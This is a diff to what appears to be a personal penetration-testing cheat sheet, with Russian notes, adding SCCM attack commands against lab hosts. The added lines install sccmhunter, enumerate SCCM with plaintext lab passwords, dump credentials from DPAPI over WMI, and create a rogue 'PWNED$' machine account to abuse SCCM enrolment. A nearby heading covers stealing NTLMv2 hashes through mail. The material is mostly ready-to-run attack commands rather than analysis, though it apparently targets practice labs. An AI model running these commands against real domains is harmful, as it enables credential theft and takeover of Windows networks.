@@ -1672,6 +1672,26 @@ rsync 10.129.228.37::public/flag.txt flag.txt
 	python3 sccmhunter.py show -all
 	sccmhunter.py smb -u blwasp -p Password123! -d lab.local -dc-ip 172.50.0.10 -save
 
+	git clone -q https://github.com/garrettfoster13/sccmhunter
+	cd sccmhunter
+	python3 -m venv .sccmhunter
+	source .sccmhunter/bin/activate
+	python3 -m pip install -r requirements.txt
+
+	Перечисление SCCM
+	python3 sccmhunter.py find -u blwasp -p Password123! -d lab.local -dc-ip 172.50.0.10
+	python3 sccmhunter.py show -all
+	python3 sccmhunter.py smb -u blwasp -p Password123! -d lab.local -dc-ip 172.50.0.10 -save
+
+
+	Сбор учетных данных: 
+	Если есть администратора для компа - выятгиваем данные их dpapi
+	python3 sccmhunter.py dpapi -u rai -p Threathunting01 -d lab.local -dc-ip 172.50.0.10 -target 172.50.0.21 -wmi
+	В качестве альтернативы:
+	Либо используем скомпроментированнный комп либо создаем новый
+	addcomputer.py -computer-name 'PWNED$' -computer-pass 'ComputerPass123' -dc-ip 172.50.0.10 'LAB.LOCAL/Blwasp':'Password123!'
+	python3 sccmhunter.py http -u blwasp -p 'Password123!' -dc-ip 172.50.0.10 -cn 'PWNED$' -cp 'ComputerPass123' -debug
+
 # Exchange
 
 # Proxylogon
@@ -1724,7 +1744,7 @@ rsync 10.129.228.37::public/flag.txt flag.txt
 	   Id  Name
    	--  ----
    	0   Windows Powershell
-# кражи хешей NTLMv2
+# кражи хешей NTLMv2 из почты
 
 	https://ipaddress/sharename/picture.ico
 	
